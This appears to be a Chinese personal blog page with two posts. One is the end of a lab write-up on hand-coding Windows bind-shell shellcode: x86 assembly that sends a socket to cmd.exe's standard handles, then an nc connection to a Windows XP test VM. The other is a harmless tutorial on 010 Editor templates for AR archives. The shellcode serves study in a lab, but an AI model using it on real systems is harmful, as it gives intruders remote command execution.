-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcess</span><span class="params">(  </span></span><br><span class="line"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span><br><span class="line"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  //这里放&quot;CMd&quot;</span></span></span><br><span class="line"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span><br><span class="line"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span><br><span class="line"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span><br><span class="line"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span><br><span class="line"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span><br><span class="line"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span><br><span class="line"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  </span></span></span><br><span class="line"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span><br><span class="line"><span class="params">)</span>;  </span><br></pre></td></tr></table></figure>
-
-<p>其中lpStartupInfo用于和套接字绑定,重要</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   DWORD cb;            <span class="comment">//包含STARTUPINFO结构中的字节数.如果Microsoft将来扩展该结构,它可用作版本控制手段.</span></span><br><span class="line">                        <span class="comment">//应用程序必须将cb初始化为sizeof(STARTUPINFO)</span></span><br><span class="line">   PSTR lpReserved;      <span class="comment">//保留。必须初始化为N U L L</span></span><br><span class="line">   PSTR lpDesktop;    <span class="comment">//用于标识启动应用程序所在的桌面的名字。如果该桌面存在，新进程便与指定的桌面相关联。</span></span><br><span class="line">                      <span class="comment">//如果桌面不存在，便创建一个带有默认属性的桌面，并使用为新进程指定的名字。</span></span><br><span class="line">                     <span class="comment">//如果lpDesktop是NULL（这是最常见的情况),那么该进程将与当前桌面相关联</span></span><br><span class="line">   PSTR lpTitle;    <span class="comment">//用于设定控制台窗口的名称。如果l p Ti t l e 是N U L L ，则可执行文件的名字将用作窗口名</span></span><br><span class="line">   DWORD dwX;       <span class="comment">//用于设定应用程序窗口在屏幕上应该放置的位置的x 和y 坐标（以像素为单位）。</span></span><br><span class="line">   DWORD dwY;       <span class="comment">//只有当子进程用CW_USEDEFAULT作为CreateWindow的x参数来创建它的第一个重叠窗口时,</span></span><br><span class="line">                    <span class="comment">//才使用这两个坐标。若是创建控制台窗口的应用程序，这些成员用于指明控制台窗口的左上角</span></span><br><span class="line"></span><br><span class="line">   DWORD dwXSize;  <span class="comment">//用于设定应用程序窗口的宽度和长度（以像素为单位）只有dwYsize</span></span><br><span class="line">    DWORD dwYSize;   <span class="comment">//当子进程将C W _ U S E D E FA U LT 用作C r e a t e Wi n d o w 的</span></span><br><span class="line">                    <span class="comment">// n Wi d t h参数来创建它的第一个重叠窗口时，才使用这些值。</span></span><br><span class="line">                     <span class="comment">//若是创建控制台窗口的应用程序，这些成员将用于指明控制台窗口的宽度</span></span><br><span class="line">   DWORD dwXCountChars;  <span class="comment">//用于设定子应用程序的控制台窗口的宽度和高度（以字符为单位）</span></span><br><span class="line">   DWORD dwYCountChars;</span><br><span class="line">   DWORD dwFillAttribute;   <span class="comment">//用于设定子应用程序的控制台窗口使用的文本和背景颜色</span></span><br><span class="line">   DWORD dwFlags;           <span class="comment">//请参见下一段和表4 - 7 的说明</span></span><br><span class="line">   WORD wShowWindow;        <span class="comment">//用于设定如果子应用程序初次调用的S h o w Wi n d o w 将S W _ S H O W D E FA U LT 作为</span></span><br><span class="line">                             <span class="comment">// n C m d S h o w 参数传递时，该应用程序的第一个重叠窗口应该如何出现。</span></span><br><span class="line">                             <span class="comment">// 本成员可以是通常用于Show Wi n d o w 函数的任何一个S W _ *标识符</span></span><br><span class="line">   WORD cbReserved2;        <span class="comment">//保留。必须被初始化为0</span></span><br><span class="line">   PBYTE lpReserved2;       <span class="comment">//保留。必须被初始化为N U L L</span></span><br><span class="line">   HANDLE hStdInput;        <span class="comment">//用于设定供控制台输入和输出用的缓存的句柄。</span></span><br><span class="line">                            <span class="comment">//按照默认设置，h S t d I n p u t 用于标识键盘缓存，</span></span><br><span class="line">                           <span class="comment">// h S t d O u t p u t 和h S t d E r r o r用于标识控制台窗口的缓存</span></span><br><span class="line">   HANDLE hStdOutput;</span><br><span class="line">   HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFO, *LPSTARTUPINFO;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3 id="初始化STARTUPINFO结构体"><a href="#初始化STARTUPINFO结构体" class="headerlink" title="初始化STARTUPINFO结构体"></a>初始化STARTUPINFO结构体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; initialise a STARTUPINFO structure at esp </span><br><span class="line">	inc byte ptr [esp + 0x2d] 	; set STARTF_USESTDHANDLES to true </span><br><span class="line">	sub edi, 0x6c 				; point edi at hStdInput in STARTUPINFO </span><br><span class="line">	stosd 					; use SOCKET descriptor returned by accept </span><br><span class="line">							; (still in eax) as the stdin handle </span><br><span class="line">	stosd 					; same for stdout </span><br><span class="line">	stosd					; same for stderr (optional) </span><br></pre></td></tr></table></figure>
-
-<p>这里edi和esp已经离得很近了,在sub edi,0x6c之前</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202314459.png" alt="image-20220918202314459"></p>
-<p>之后</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202330635.png" alt="image-20220918202330635"></p>
-<p>然后在edi的最后三个双字上(stdinput,stdout,stderr)都设置为eax中的套接字描述符</p>
-<p>剩余的字节都是0</p>
-<h3 id="CreateProcessA"><a href="#CreateProcessA" class="headerlink" title="CreateProcessA"></a>CreateProcessA</h3><p>栈顶位置还啥也没写,推给eax当0用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; create process </span><br><span class="line">	pop eax 			; set eax = 0 (STARTUPINFO now at esp + 4) </span><br><span class="line">	push esp			; use stack as PROCESSINFORMATION structure </span><br><span class="line">	; (STARTUPINFO now back to esp) </span><br><span class="line">	push esp 			; STARTUPINFO structure </span><br><span class="line">	push eax 		; lpCurrentDirectory = NULL </span><br><span class="line">	push eax 		; lpEnvironment = NULL </span><br><span class="line">	push eax 		; dwCreationFlags = NULL </span><br><span class="line">	push esp 			; bInheritHandles = true </span><br><span class="line">	push eax 		; lpThreadAttributes = NULL </span><br><span class="line">	push eax 		; lpProcessAttributes = NULL </span><br><span class="line">	push esi 			; lpCommandLine = &quot;cmd&quot; </span><br><span class="line">	push eax 		; lpApplicationName = NULL </span><br><span class="line">	call [esi - 0x1c] 	; CreateProcessA </span><br></pre></td></tr></table></figure>
-
-<p>这就创建了一个cmd进程,其三标都重定向到套接字了</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>windows XP靶机和win10主机采用NAT连接方式,XP靶机的ip地址为192.168.191.137</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203112083.png" alt="靶机地址"></p>
-<p>在主机上<code>nc 192.168.191.137 6666</code></p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203216136.png" alt="通了"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/17/010editor%20%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
-      <meta itemprop="name" content="dustball">
-      <meta itemprop="description" content="dustland">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dustland">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/17/010editor%20%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/" class="post-title-link" itemprop="url">010editor 模板语法</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-09-17 23:55:00 / Modified: 23:56:55" itemprop="dateCreated datePublished" datetime="2022-09-17T23:55:00+08:00">2022-09-17</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="010editor-模板编写"><a href="#010editor-模板编写" class="headerlink" title="010editor 模板编写"></a>010editor 模板编写</h1><p>以linux上的归档文件AR,或者说windows上的静态库LIB为例看看模板是咋写的</p>
-<p>总的来说,写010editor模板就是定义结构体.</p>
-<h2 id="AR结构"><a href="#AR结构" class="headerlink" title="AR结构"></a>AR结构</h2><p>需要结合AR文件的结构,理解AR模板</p>
-<p><a target="_blank" rel="noopener" href="https://dustball.top/2022/08/19/lib%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">程序员的自我修养 chapter 9 LIB | Deutschball’s blog (dustball.top)</a></p>
-<p>AR文件由一个签名魔数<code>!&lt;arch&gt;\n</code>还有多个obj模块组成,</p>
-<p>每个obj模块之前都会有一个头,作用是描述该obj模块的信息</p>
-<p>这个头的定义大概是这样的,字节数是对的,但是变量名叫啥无所谓</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>    fileName[<span class="number">16</span>];<span class="comment">//文件名</span></span><br><span class="line">    <span class="type">char</span>    modification_timestamp[<span class="number">12</span>];<span class="comment">//最后修改时间戳</span></span><br><span class="line">    <span class="type">char</span>    ownerID[<span class="number">6</span>];<span class="comment">//拥有者ID</span></span><br><span class="line">    <span class="type">char</span>    groupID[<span class="number">6</span>];<span class="comment">//组ID</span></span><br><span class="line">    <span class="type">char</span>    fileMode[<span class="number">8</span>];<span class="comment">//文件模式</span></span><br><span class="line">    <span class="type">char</span>    fileSize[<span class="number">10</span>];<span class="comment">//文件大小</span></span><br><span class="line">    <span class="type">char</span>    endMarker[<span class="number">2</span>];<span class="comment">//本头结束符</span></span><br><span class="line">&#125; OBJ_HEADER;</span><br></pre></td></tr></table></figure>
-
-<p>后面紧跟着就是obj模块正文了</p>
-<p>如果obj模块的大小是一个奇数,则后面再填充一个字节</p>
-<p>这就是一个obj模块在AR文件中的状态</p>
-<h2 id="AR模板"><a href="#AR模板" class="headerlink" title="AR模板"></a>AR模板</h2><h3 id="结构定义"><a href="#结构定义" class="headerlink" title="结构定义"></a>结构定义</h3><p>AR 模板的主体就是这么一个ar_flie结构体,成员他都有,又附加了一些额外的函数等等</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="comment">// Define header</span></span><br><span class="line">    SetBackColor( cLtYellow );<span class="comment">//从这里开始的数据被高亮为亮黄色</span></span><br><span class="line">    <span class="type">char</span>    fileName[<span class="number">16</span>];<span class="comment">//文件名,没有local修饰,会显示</span></span><br><span class="line">    <span class="type">char</span>    modification_timestamp[<span class="number">12</span>];</span><br><span class="line">    <span class="type">char</span>    ownerID[<span class="number">6</span>];</span><br><span class="line">    <span class="type">char</span>    groupID[<span class="number">6</span>];</span><br><span class="line">    <span class="type">char</span>    fileMode[<span class="number">8</span>];</span><br><span class="line">    <span class="type">char</span>    fileSize[<span class="number">10</span>];</span><br><span class="line">    <span class="type">char</span>    endMarker[<span class="number">2</span>];</span><br><span class="line">    SetBackColor( cNone );<span class="comment">//取消高亮</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Define file data</span></span><br><span class="line">    <span class="keyword">if</span>( endMarker == <span class="string">&quot;\x60\x0a&quot;</span> )<span class="comment">//如果endMarker==&#x27;\0x60\0x0a&#x27;说明都对齐了,没有差错</span></span><br><span class="line">    &#123;</span><br><span class="line">        local int64 size;<span class="comment">//local变量不会显示,只是计算使用</span></span><br><span class="line">        SScanf( fileSize, <span class="string">&quot;%Ld&quot;</span>, size );<span class="comment">//010editor API,将fileSize转化成长整型,放到格式化参数size上</span></span><br><span class="line">        <span class="keyword">if</span>( size &gt; <span class="number">0</span> )<span class="comment">//如果size&gt;0说明本头是有对应obj模块的,obj模块的大小已经在filesize中给出了</span></span><br><span class="line">            uchar data[size];<span class="comment">//此处定义的uchar data[size]没有用local修饰,是会显示的,size会显示出变量值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add padding byte</span></span><br><span class="line">        <span class="keyword">if</span>( size &amp; <span class="number">1</span> )<span class="comment">//如果size文件大小是个奇数则最后填充一个字节</span></span><br><span class="line">            uchar padding &lt;bgcolor=cLtGray&gt;;<span class="comment">//该填充字节使用亮灰色高亮</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; ar_file &lt;read=ReadArFile&gt;;<span class="comment">//读回调函数声明为ReadArFile</span></span><br><span class="line"><span class="comment">// Display filename beside ar_file struct</span></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">ReadArFile</span><span class="params">( <span class="keyword">struct</span> ar_file &amp;f )</span><span class="comment">//读回调函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> f.fileName + <span class="string">&quot; size=&quot;</span> + f.fileSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>读回调函数的返回值是一个string字符串,将会显示在Value栏</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917231952934.png" alt="image-20220917231952934"></p>
-<h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><p>上述<code>typedef struct ar_file</code>和ReadArFile都只是定义,这一点和C语言相同,并没有实例化ar_file结构体的对象,也没有调用ReadArFile函数,下面才开始控制流</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read the file signature</span></span><br><span class="line"><span class="type">char</span> signature[<span class="number">8</span>] &lt;bgcolor=cLtPurple&gt;;<span class="comment">//首先定义8个字节用来承载文件魔数,亮紫色高亮</span></span><br><span class="line"><span class="keyword">if</span>( signature != <span class="string">&quot;!&lt;arch&gt;\n&quot;</span> )<span class="comment">//判断魔数是否是AR的魔数,如果不是则返回-1表明模板错误</span></span><br><span class="line">&#123;</span><br><span class="line">    Warning( <span class="string">&quot;File is not a valid archive. Template stopped.&quot;</span> );<span class="comment">//API函数,发出警告</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read file records</span></span><br><span class="line"><span class="keyword">while</span>( !FEof() )<span class="comment">//FEof为010editor API,用于检查当前文件指针是否到达文件末尾</span></span><br><span class="line">&#123;</span><br><span class="line">    ar_file file;<span class="comment">//如果文件指针没有到达末尾,说明还有obj模块的信息没有分析,每次读入填充一个ar_file,直到全都读取完毕</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>每个obj模块的正文长度都是不一样的,但是读取的时候都是创建ar_file,怎么体现对于不同模块的区别对待呢?</p>
-<p>已经包含在ar_file结构体的定义中了</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( size &gt; <span class="number">0</span> )<span class="comment">//如果size&gt;0说明本头是有对应obj模块的,obj模块的大小已经在filesize中给出了</span></span><br><span class="line">           uchar data[size];<span class="comment">//此处定义的uchar data[size]没有用local修饰,是会显示的,size会显示出变量值</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>不得不说,优雅,真的太优雅了,010editor将复杂的工作留给自己</p>
-<h2 id="模板的组成"><a href="#模板的组成" class="headerlink" title="模板的组成"></a>模板的组成</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>只要是在控制流中创建的变量,都分成两种,带<code>local</code>的和不带<code>local</code>的</p>
-<p>带<code>local</code>的是临时变量,不会显示在界面上,只用于承载临时变量,比如作为循环变量或者中间结果</p>
-<p>在AR模板中<code>local int size</code>就作为中间结果承载<code>filesize</code>字符串的转换值</p>
-<p>不带<code>local</code>的就是界面变量,会显示在界面上.比如<code>ar_file file;</code>比如<code>char signature[8];</code></p>
-<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>尖括号内可以附加属性</p>
-<p>比如<code>uchar padding &lt;bgcolor=cLtGray&gt;;</code>这就把一个字节的填充设置为亮灰色</p>
-<p>比如<code>char signature[8] &lt;bgcolor=cLtPurple&gt;;</code>就把魔数签名设置为亮紫色了</p>
-<p>又如<code>ar_file &lt;read=ReadArFile&gt;;</code>就给每个<code>ar_file</code>头都设置了读回调函数<code>ReadArFile</code></p>
-<p>该函数的作用是在头的value域上写<code>f.fileName + &quot; size=&quot; + f.fileSize</code></p>
-<p>常用的属性有</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;format=hex|decimal|octal|binary&gt;,<span class="comment">//设置数字显示格式</span></span><br><span class="line">fgcolor=&lt;color&gt;, <span class="comment">//前景色</span></span><br><span class="line">bgcolor=&lt;color&gt;, <span class="comment">//背景色</span></span><br><span class="line">comment= <span class="string">&quot;&lt;string&gt;&quot;</span>, <span class="comment">//注释</span></span><br><span class="line">open=<span class="literal">true</span>|<span class="literal">false</span>|suppress, <span class="comment">//默认情况下是折叠还是展开</span></span><br><span class="line">hidden=<span class="literal">true</span>|<span class="literal">false</span>, <span class="comment">//</span></span><br><span class="line">read=&lt;function_name&gt;, <span class="comment">//读回调函数</span></span><br><span class="line">write=&lt;function_name&gt; <span class="comment">//写回调函数</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ba60ebd8f916">010Editor脚本语法入门 - 简书 (jianshu.com)</a></p>
-<p>想用啥功能就去查010editor的啥函数</p>
 
       
     </div>
